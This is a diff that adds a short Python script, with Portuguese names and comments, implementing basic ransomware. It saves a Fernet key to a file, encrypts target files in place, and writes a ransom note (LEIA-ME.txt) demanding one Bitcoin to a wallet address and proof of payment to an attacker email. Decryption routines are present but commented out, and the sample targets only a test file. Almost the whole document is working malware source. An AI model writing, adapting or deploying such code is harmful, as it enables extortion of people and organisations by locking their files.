@@ -1,0 +1,61 @@
+from cryptography.fernet import Fernet
+import os
+
+def gerar_chave():
+    chave = Fernet.generate_key()
+    with open("chave.key", "wb") as chave_file:
+        chave_file.write(chave)
+
+def carregar_chave():
+    return open("chave.key", "rb").read()
+
+def criptografar_arquivo(arquivo, chave):
+    fernet = Fernet(chave)
+    with open(arquivo, "rb") as file:
+        dados = file.read()
+    dados_criptografados = fernet.encrypt(dados)
+    with open(arquivo, "wb") as file:
+        file.write(dados_criptografados)
+
+def descriptografar_arquivo(arquivo, chave):
+    fernet = Fernet(chave)
+    with open(arquivo, "rb") as file:
+        dados = file.read()
+    dados_descriptografados = fernet.decrypt(dados)
+    with open(arquivo, "wb") as file:
+        file.write(dados_descriptografados)
+
+def criar_mensagem_resgate():
+    mensagem = """
+    Seus arquivos foram criptografados!
+    Para recuperar, pague 1 Bitcoin para: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+    Envie o comprovante para: atacante@email.com
+    """
+    with open("LEIA-ME.txt", "w") as file:
+        file.write(mensagem)
+
+if __name__ == "__main__":
+    # Gerar chave (faça isso uma vez)
+    gerar_chave()
+    
+    # Carregar chave
+    chave = carregar_chave()
+    
+    # Arquivos a criptografar (exemplo)
+    arquivos = ["arquivo_teste.txt"]
+    
+    # Criptografar
+    for arquivo in arquivos:
+        if os.path.exists(arquivo):
+            criptografar_arquivo(arquivo, chave)
+    
+    # Criar mensagem de resgate
+    criar_mensagem_resgate()
+    
+    print("Arquivos criptografados. Para descriptografar, execute novamente com a chave.")
+    
+    # Para descriptografar (descomente após criptografia)
+    # for arquivo in arquivos:
+    #     if os.path.exists(arquivo):
+    #         descriptografar_arquivo(arquivo, chave)
+    # print("Arquivos descriptografados.")
